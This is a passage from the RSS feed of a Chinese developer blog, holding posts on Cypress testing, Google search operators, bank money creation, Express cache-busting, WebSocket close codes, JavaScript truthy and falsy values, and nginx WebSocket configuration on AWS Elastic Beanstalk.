&lt;li&gt;&lt;code&gt;Debug友好&lt;/code&gt; 不需要再去猜测为什么测试有失败了，Cypress提供Chrome DevTools, 所以Debug是非常方便的。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;实时刷新&lt;/code&gt; Cypress检测测试用例改变后，会自动刷新&lt;/li&gt;
&lt;li&gt;&lt;code&gt;自动等待&lt;/code&gt; 不需要在使用wait类似的方法等待某个DOM出现，Cypress会自动帮你做这些&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Spies, stubs, and clocks&lt;/code&gt; Verify and control the behavior of functions, server responses, or timers. The same functionality you love from unit testing is right at your fingertips.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;网络流量控制&lt;/code&gt; 在不涉及服务器的情况下轻松控制，存根和测试边缘案例。无论你喜欢，你都可以存储网络流量。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;一致的结果&lt;/code&gt; 我们的架构不使用Selenium或WebDriver。向快速，一致和可靠的无剥落测试问好。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;截图和视频&lt;/code&gt; 查看失败时自动截取的截图，或无条件运行时整个测试套件的视频。&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;4-安装cypress&#34;&gt;4. 安装cypress&lt;/h1&gt;
&lt;h2 id=&#34;41-使用npm方法安装&#34;&gt;4.1. 使用npm方法安装&lt;/h2&gt;
&lt;p&gt;注意这个方法需要下载压缩过Electron, 所以可能会花费几分钟时间，请耐心等待。&lt;/p&gt;</description>
    </item>
    <item>
      <title>掌握谷歌搜索高级指令</title>
      <link>https://wdd.js.org/posts/2018/04/master-google-search-command/</link>
      <pubDate>Thu, 26 Apr 2018 16:56:01 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2018/04/master-google-search-command/</guid>
      <description>&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;#1-%E8%B0%B7%E6%AD%8C%E6%90%9C%E7%B4%A2%E6%8C%87%E4%BB%A4&#34;&gt;1. 谷歌搜索指令&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#2-%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4&#34;&gt;2. 基本命令&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#3-%E5%85%B3%E9%94%AE%E8%AF%8D%E4%BD%BF%E7%94%A8&#34;&gt;3. 关键词使用&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#4-%E7%89%B9%E6%AE%8A%E5%B7%A5%E5%85%B7&#34;&gt;4. 特殊工具&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;#41-define-%E5%BF%AB%E9%80%9F%E8%BF%94%E5%9B%9E%E5%85%B3%E9%94%AE%E8%AF%8D%E5%AE%9A%E4%B9%89&#34;&gt;4.1. define 快速返回关键词定义&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#42-%E8%AE%A1%E7%AE%97%E5%99%A8&#34;&gt;4.2. 计算器&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#43-%E5%8D%95%E4%BD%8D%E8%BD%AC%E6%8D%A2&#34;&gt;4.3. 单位转换&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#44-%E6%97%B6%E5%8C%BA%E6%9F%A5%E8%AF%A2&#34;&gt;4.4. 时区查询&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#45-%E5%9C%B0%E5%8C%BA%E6%9F%A5%E8%AF%A2&#34;&gt;4.5. 地区查询&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#46-%E5%A4%A9%E6%B0%94%E6%9F%A5%E8%AF%A2&#34;&gt;4.6. 天气查询&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#5-%E5%8F%82%E8%80%83&#34;&gt;5. 参考&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;1-谷歌搜索指令&#34;&gt;1. 谷歌搜索指令&lt;/h1&gt;
&lt;h1 id=&#34;2-基本命令&#34;&gt;2. 基本命令&lt;/h1&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;符号&lt;/th&gt;
          &lt;th&gt;简介&lt;/th&gt;
          &lt;th&gt;语法&lt;/th&gt;
          &lt;th&gt;注意点&lt;/th&gt;
          &lt;th&gt;示例&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;ul&gt;
&lt;li&gt;| 包含A且必须包含B | A +B | A和+之间有空格 | Maxwell +wills&lt;/li&gt;
&lt;/ul&gt;
&lt;ul&gt;
&lt;li&gt;| 包含A且不包含B | A -B | A和+之间有空格 | Maxwell -Absolom
&amp;quot; &amp;quot; | 完整匹配AB | &amp;ldquo;AB&amp;rdquo; | | &amp;ldquo;Thomas Jefferson&amp;rdquo;
OR | 包含A或者B | &lt;code&gt;A OR B&lt;/code&gt; 或者 &lt;code&gt;A | B&lt;/code&gt; |  | nodejs OR webpack
+-&amp;ldquo;OR | 指令可以组合，完成更复杂的查询 | | |  beach -sandy +albert +nathaniel
~ | 包含A, 并且包含B的近义词 | A ~B | | github ~js
.. | 区间查询 AB之间 | A..B | | china 1888..2000&lt;/li&gt;
&lt;/ul&gt;
&lt;ul&gt;
&lt;li&gt;| 匹配任意字符 | | | node* java
site: | 站内搜索 | A site:B | | | DLL site:webpack.js.org
filetype: | 按照文件类型搜索 | A filetype:B | | csta filetype:pdf&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;3-关键词使用&#34;&gt;3. 关键词使用&lt;/h1&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;方法&lt;/th&gt;
          &lt;th&gt;说明&lt;/th&gt;
          &lt;th&gt;示例&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;列举关键词&lt;/td&gt;
          &lt;td&gt;列举所有和搜索相关的关键词，并且尽量把重要的关键词排在前面。&lt;code&gt;不同的关键词顺序会导致不同的返回不同的结果&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;书法 毛笔 绘画&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;不要使用某些词&lt;/td&gt;
          &lt;td&gt;如代词介词语气词，如i, the, of, it, 我，吗&lt;/td&gt;
          &lt;td&gt;搜索引擎一般会直接忽略这些信息含量少的词&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;大小写不敏感&lt;/td&gt;
          &lt;td&gt;大写字符和小写字符在搜索引擎看没有区别，尽量使用小写的就可以&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h1 id=&#34;4-特殊工具&#34;&gt;4. 特殊工具&lt;/h1&gt;
&lt;h2 id=&#34;41-define-快速返回关键词定义&#34;&gt;4.1. define 快速返回关键词定义&lt;/h2&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/img/images/20180426175550_4QI50S_Jietu20180426-175542.jpeg&#34;&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>金钱游戏 - 银行造钱的秘密</title>
      <link>https://wdd.js.org/posts/2018/04/the-secret-of-bank-create-money/</link>
      <pubDate>Wed, 25 Apr 2018 13:33:52 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2018/04/the-secret-of-bank-create-money/</guid>
      <description>&lt;h1 id=&#34;1-角色划分&#34;&gt;1. 角色划分&lt;/h1&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;名称&lt;/th&gt;
          &lt;th&gt;角色&lt;/th&gt;
          &lt;th&gt;账户&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;A&lt;/td&gt;
          &lt;td&gt;银行家&lt;/td&gt;
          &lt;td&gt;0&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;B&lt;/td&gt;
          &lt;td&gt;建筑商&lt;/td&gt;
          &lt;td&gt;100万&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;C&lt;/td&gt;
          &lt;td&gt;商人&lt;/td&gt;
          &lt;td&gt;0&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h1 id=&#34;2-建筑商向银行存储100万&#34;&gt;2. 建筑商向银行存储100万&lt;/h1&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;名称&lt;/th&gt;
          &lt;th&gt;角色&lt;/th&gt;
          &lt;th&gt;账户&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;A&lt;/td&gt;
          &lt;td&gt;银行家&lt;/td&gt;
          &lt;td&gt;100万 现金&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;B&lt;/td&gt;
          &lt;td&gt;建筑商&lt;/td&gt;
          &lt;td&gt;100万 支票&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;C&lt;/td&gt;
          &lt;td&gt;商人&lt;/td&gt;
          &lt;td&gt;0&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h1 id=&#34;2-商人向银行贷款100万&#34;&gt;2. 商人向银行贷款100万&lt;/h1&gt;
&lt;p&gt;此时银行的账户存款已经是0了，但是B还在银行存了100万。那银行究竟是还有100万呢, 还是一毛都没有了呢。&lt;/p&gt;
&lt;p&gt;此时建筑商如果要取现金，那么银行马上就要破产。&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;名称&lt;/th&gt;
          &lt;th&gt;角色&lt;/th&gt;
          &lt;th&gt;账户&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;A&lt;/td&gt;
          &lt;td&gt;银行家&lt;/td&gt;
          &lt;td&gt;100现金&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;B&lt;/td&gt;
          &lt;td&gt;建筑商&lt;/td&gt;
          &lt;td&gt;100万 支票&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;C&lt;/td&gt;
          &lt;td&gt;商人&lt;/td&gt;
          &lt;td&gt;100万 支票&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h1 id=&#34;3-商人需要建筑商来建造房子&#34;&gt;3. 商人需要建筑商来建造房子&lt;/h1&gt;
&lt;p&gt;商人需要建筑商来建筑房子，费用是100万，付给建筑商，建筑商又把100支票存到银行&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;名称&lt;/th&gt;
          &lt;th&gt;角色&lt;/th&gt;
          &lt;th&gt;账户&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;A&lt;/td&gt;
          &lt;td&gt;银行家&lt;/td&gt;
          &lt;td&gt;100万现金&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;B&lt;/td&gt;
          &lt;td&gt;建筑商&lt;/td&gt;
          &lt;td&gt;200万 支票&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;C&lt;/td&gt;
          &lt;td&gt;商人&lt;/td&gt;
          &lt;td&gt;0&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;商人又从银行借钱100万，来付给建筑商建房子，建筑商把钱存到银行&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;名称&lt;/th&gt;
          &lt;th&gt;角色&lt;/th&gt;
          &lt;th&gt;账户&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;A&lt;/td&gt;
          &lt;td&gt;银行家&lt;/td&gt;
          &lt;td&gt;100万现金&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;B&lt;/td&gt;
          &lt;td&gt;建筑商&lt;/td&gt;
          &lt;td&gt;300万 支票&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;C&lt;/td&gt;
          &lt;td&gt;商人&lt;/td&gt;
          &lt;td&gt;0&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;只要这个循环还在继续，你会发现，建筑商的账面上的支票越来越多，但是银行始终都是100万现金存在那里，从来都没动过。&lt;/p&gt;</description>
    </item>
    <item>
      <title>Express静态文件浏览器缓存设置与缓存清除</title>
      <link>https://wdd.js.org/posts/2018/04/express-static-file-cache-setting-and-cleaning/</link>
      <pubDate>Sun, 08 Apr 2018 09:00:48 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2018/04/express-static-file-cache-setting-and-cleaning/</guid>
      <description>&lt;h1 id=&#34;1-express设置缓存&#34;&gt;1. Express设置缓存&lt;/h1&gt;
&lt;p&gt;Express设置静态文件的方法很简单，一行代码搞定。&lt;code&gt;app.use(express.static(path.join(__dirname, &#39;public&#39;), {maxAge: MAX_AGE}))&lt;/code&gt;,
注意MAX_AGE的单位是毫秒。这句代码的含义是让pulic目录下的所有文件都可以在浏览器中缓存，过期时长为MAX_AGE毫秒。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;app.use(express.static(path.join(__dirname, &amp;#39;public&amp;#39;), {maxAge: config.get(&amp;#39;maxAge&amp;#39;)}))
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;2-express让浏览器清除缓存&#34;&gt;2. Express让浏览器清除缓存&lt;/h1&gt;
&lt;p&gt;缓存的好处是可以更快的访问服务，但是缓存也有坏处。例如设置缓存为10天，第二天的时候服务更新了。如果客户端不强制刷新页面的话，浏览器会一致使用更新前的静态文件，这样会导致一些BUG。你总当每次出问题时，客户打电话给你后，你让他强制刷新浏览器吧？&lt;/p&gt;
&lt;p&gt;所以，最好在服务重启后，重新让浏览器获取最新的静态文件。&lt;/p&gt;
&lt;p&gt;设置的方式是给每一个静态文件设置一个时间戳。&lt;/p&gt;
&lt;p&gt;例如：&lt;code&gt;vendor/loadjs/load.js?_=123898923423&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;21-express-路由&#34;&gt;2.1. Express 路由&lt;/h2&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;// /routes/index.js
router.get(&amp;#39;/home&amp;#39;, function (req, res, next) {
  res.render(&amp;#39;home&amp;#39;, {config: config, serverStartTimestamp: new Date().getTime()})
})
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;22-视图文件&#34;&gt;2.2. 视图文件&lt;/h2&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;// views/home.html
&amp;lt;script src=&amp;#34;vendor/loadjs/load.js?_=&amp;lt;%= serverStartTimestamp %&amp;gt;&amp;#34;&amp;gt;&amp;lt;/script&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;设置之后，每次服务更新或者重启，浏览器都会使用最新的时间戳serverStartTimestamp，去获取静态文件。&lt;/p&gt;
&lt;h2 id=&#34;23-动态加载js文件&#34;&gt;2.3. 动态加载JS文件&lt;/h2&gt;
&lt;p&gt;有时候js文件并不是直接在HTML中引入，可能是使用了一些js文件加载库，例如requirejs, LABjs等。这些情况下，可以在全局设置环境变量SERVER_START_TIMESTAMP，用来表示服务启动的时间戳，在获取js的时候，将该时间戳拼接在路径上。&lt;/p&gt;
&lt;p&gt;注意：&lt;code&gt;环境变量SERVER_START_TIMESTAMP，一定要在其他脚本使用前定义。&lt;/code&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;// views/home.html
&amp;lt;script&amp;gt;
  var SERVER_START_TIMESTAMP = &amp;lt;%= serverStartTimestamp %&amp;gt;
&amp;lt;/script&amp;gt;

// load.js
&amp;#39;vendor/contact-center/skill.js?_=&amp;#39; + SERVER_START_TIMESTAMP
&lt;/code&gt;&lt;/pre&gt;</description>
    </item>
    <item>
      <title>WebSocket断开原因分析</title>
      <link>https://wdd.js.org/posts/2018/03/websocket-close-reasons/</link>
      <pubDate>Thu, 29 Mar 2018 20:35:38 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2018/03/websocket-close-reasons/</guid>
      <description>&lt;h1 id=&#34;1-把错误打印出来&#34;&gt;1. 把错误打印出来&lt;/h1&gt;
&lt;p&gt;WebSocket断开的原因有很多，最好在WebSocket断开时，将错误打印出来。&lt;/p&gt;
&lt;p&gt;在线demo地址：https://wdd.js.org/websocket-demos/&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/img/images/20180425112232_cxPVAD_Jietu20180425-112142.jpeg&#34;&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;ws.onerror = function (e) {
  console.log(&amp;#39;WebSocket发生错误: &amp;#39; + e.code)
  console.log(e)
}
&lt;/code&gt;&lt;/pre&gt;&lt;blockquote&gt;
&lt;p&gt;如果你想自己玩玩WebSocket, 但是你又不想自己部署一个WebSocket服务器，你可以使用&lt;code&gt;ws = new WebSocket(&#39;wss://echo.websocket.org/&#39;)&lt;/code&gt;, 你向echo.websocket.org发送消息，它会回复你同样的消息。&lt;/p&gt;&lt;/blockquote&gt;
&lt;h1 id=&#34;2-重要信息错误状态码&#34;&gt;2. 重要信息错误状态码&lt;/h1&gt;
&lt;p&gt;WebSocket断开时，会触发&lt;code&gt;CloseEvent&lt;/code&gt;, CloseEvent会在连接关闭时发送给使用 WebSockets 的客户端. 它在 WebSocket 对象的 onclose 事件监听器中使用。CloseEvent的code字段表示了WebSocket断开的原因。可以从该字段中分析断开的原因。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/img/images/20180329204553_TjCFdu_Jietu20180329-204536.jpeg&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;3-关闭状态码表&#34;&gt;3. 关闭状态码表&lt;/h1&gt;
&lt;p&gt;一般来说&lt;code&gt;1006&lt;/code&gt;的错误码出现的情况比较常见，该错误码一般出现在断网时。&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;状态码&lt;/th&gt;
          &lt;th&gt;名称&lt;/th&gt;
          &lt;th&gt;描述&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;0–999&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;保留段, 未使用.&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;1000&lt;/td&gt;
          &lt;td&gt;CLOSE_NORMAL&lt;/td&gt;
          &lt;td&gt;正常关闭; 无论为何目的而创建, 该链接都已成功完成任务.&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;1001&lt;/td&gt;
          &lt;td&gt;CLOSE_GOING_AWAY&lt;/td&gt;
          &lt;td&gt;终端离开, 可能因为服务端错误, 也可能因为浏览器正从打开连接的页面跳转离开.&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;1002&lt;/td&gt;
          &lt;td&gt;CLOSE_PROTOCOL_ERROR&lt;/td&gt;
          &lt;td&gt;由于协议错误而中断连接.&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;1003&lt;/td&gt;
          &lt;td&gt;CLOSE_UNSUPPORTED&lt;/td&gt;
          &lt;td&gt;由于接收到不允许的数据类型而断开连接 (如仅接收文本数据的终端接收到了二进制数据).&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;1004&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;保留&lt;/code&gt;. 其意义可能会在未来定义.&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;1005&lt;/td&gt;
          &lt;td&gt;CLOSE_NO_STATUS&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;保留&lt;/code&gt;.  表示没有收到预期的状态码.&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;1006&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;CLOSE_ABNORMAL&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;保留&lt;/code&gt;. 用于期望收到状态码时连接非正常关闭 (也就是说, 没有发送关闭帧).&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;1007&lt;/td&gt;
          &lt;td&gt;Unsupported Data&lt;/td&gt;
          &lt;td&gt;由于收到了格式不符的数据而断开连接 (如文本消息中包含了非 UTF-8 数据).&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;1008&lt;/td&gt;
          &lt;td&gt;Policy Violation&lt;/td&gt;
          &lt;td&gt;由于收到不符合约定的数据而断开连接. 这是一个通用状态码, 用于不适合使用 1003 和 1009 状态码的场景.&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;1009&lt;/td&gt;
          &lt;td&gt;CLOSE_TOO_LARGE&lt;/td&gt;
          &lt;td&gt;由于收到过大的数据帧而断开连接.&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;1010&lt;/td&gt;
          &lt;td&gt;Missing Extension&lt;/td&gt;
          &lt;td&gt;客户端期望服务器商定一个或多个拓展, 但服务器没有处理, 因此客户端断开连接.&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;1011&lt;/td&gt;
          &lt;td&gt;Internal Error&lt;/td&gt;
          &lt;td&gt;客户端由于遇到没有预料的情况阻止其完成请求, 因此服务端断开连接.&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;1012&lt;/td&gt;
          &lt;td&gt;Service Restart&lt;/td&gt;
          &lt;td&gt;服务器由于重启而断开连接.&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;1013&lt;/td&gt;
          &lt;td&gt;Try Again Later&lt;/td&gt;
          &lt;td&gt;服务器由于临时原因断开连接, 如服务器过载因此断开一部分客户端连接.&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;1014&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;由 WebSocket标准保留以便未来使用.&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;1015&lt;/td&gt;
          &lt;td&gt;TLS Handshake&lt;/td&gt;
          &lt;td&gt;保留. 表示连接由于无法完成 TLS 握手而关闭 (例如无法验证服务器证书).&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;1016–1999&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;由 WebSocket标准保留以便未来使用.&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;2000–2999&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;由 WebSocket拓展保留使用.&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;3000–3999&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;可以由库或框架使用.? 不应由应用使用. 可以在 IANA 注册, 先到先得.&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;4000–4999&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;可以由应用使用.&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h1 id=&#34;4-其他注意事项&#34;&gt;4. 其他注意事项&lt;/h1&gt;
&lt;p&gt;如果你的服务所在的域是HTTPS的，那么使用的WebSocket协议也必须是&lt;code&gt;wss&lt;/code&gt;, 而不能是&lt;code&gt;ws&lt;/code&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>js中的真值和假值</title>
      <link>https://wdd.js.org/posts/2018/03/js-true-and-false-value/</link>
      <pubDate>Tue, 27 Mar 2018 14:31:01 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2018/03/js-true-and-false-value/</guid>
      <description>&lt;p&gt;&lt;code&gt;无论什么语言，都需要逻辑，而逻辑中，能否判断出真假，是最基本也是最重要技能之一&lt;/code&gt;。&lt;/p&gt;
&lt;h1 id=&#34;js中的假值有6个&#34;&gt;JS中的假值有6个&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;false&lt;/li&gt;
&lt;li&gt;&#39;&#39;&lt;/li&gt;
&lt;li&gt;undefinded&lt;/li&gt;
&lt;li&gt;null&lt;/li&gt;
&lt;li&gt;0, +0, -0&lt;/li&gt;
&lt;li&gt;NaN&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;有点类似假值的真值有两个&#34;&gt;有点类似假值的真值有两个&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;{}&lt;/li&gt;
&lt;li&gt;[]&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;空对象和空数组，很多初学者都很用把这两个当做假值。但是实际上他们是真值，你只需要记住，除了null之外的所有对象类型的数据，都是真值。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;typeof null // &amp;#39;object&amp;#39;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;据说：&lt;code&gt;typeof null返回对象这是一个js语言中的bug。&lt;/code&gt;实际上typeof null应该返回null才比较准确，但是这个bug已经存来好久了。几乎所有的代码里都这样去判断。如果把typeof null给改成返回null, 那么这必定会导致JS世界末日。&lt;/p&gt;
&lt;p&gt;我们承认&lt;code&gt;JS并不完美&lt;/code&gt;，她有很多小缺点，但是这并不妨碍她吸引万千开发者拜倒在她的石榴裙下。&lt;/p&gt;
&lt;p&gt;就像一首歌唱的：&lt;code&gt;有些人说不清哪里好 但就是谁都替代不了&lt;/code&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>在实践中我遇到stompjs, websocket和nginx的问题与总结</title>
      <link>https://wdd.js.org/posts/2018/03/stomp-over-websocket/</link>
      <pubDate>Tue, 20 Mar 2018 22:09:34 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2018/03/stomp-over-websocket/</guid>
      <description>&lt;h1 id=&#34;1-aws-ec2-不支持websocket&#34;&gt;1. AWS EC2 不支持WebSocket&lt;/h1&gt;
&lt;p&gt;&lt;a href=&#34;https://www.menubar.io/websockets-aws-elasticbeanstalk-ec2/&#34;&gt;直达解决方案 英文版&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;简单说一下思路：WebSocket底层基于TCP协议的，如果你的服务器基于HTTP协议暴露80端口，那WebSocket肯定无法连接。&lt;code&gt;你只要将HTTP协议修改成TCP协议就可以了。&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/img/images/20180320223231_T2gHyb_Screenshot.jpeg&#34;&gt;&lt;/p&gt;
&lt;p&gt;然后是安全组的配置：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/img/images/20180320223255_pGGCWF_Screenshot.jpeg&#34;&gt;&lt;/p&gt;
&lt;p&gt;同样如果使用了NGINX作为反向代理，那么NGINX也需要做配置的。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;// https://gist.githubusercontent.com/unshift/324be6a8dc9e880d4d670de0dc97a8ce/raw/29507ed6b3c9394ecd7842f9d3228827cffd1c58/elasticbeanstalk_websockets

files:
    &amp;#34;/etc/nginx/conf.d/01_websockets.conf&amp;#34; :
        mode: &amp;#34;000644&amp;#34;
        owner: root
        group: root
        content : |
            upstream nodejs {
                server 127.0.0.1:8081;
                keepalive 256;
            }

            server {
                listen 8080;

                location / {
                    proxy_pass  http://nodejs;
                    proxy_set_header Upgrade $http_upgrade;
                    proxy_set_header Connection &amp;#34;upgrade&amp;#34;;
                    proxy_http_version 1.1;
                    proxy_set_header        Host            $host;
                    proxy_set_header        X-Real-IP       $remote_addr;
                    proxy_set_header        X-Forwarded-For $proxy_add_x_forwarded_for;
                }
            }

    &amp;#34;/opt/elasticbeanstalk/hooks/appdeploy/enact/41_remove_eb_nginx_confg.sh&amp;#34;:
        mode: &amp;#34;000755&amp;#34;
        owner: root
        group: root
        content : |
            mv /etc/nginx/conf.d/00_elastic_beanstalk_proxy.conf /etc/nginx/conf.d/00_elastic_beanstalk_proxy.conf.old
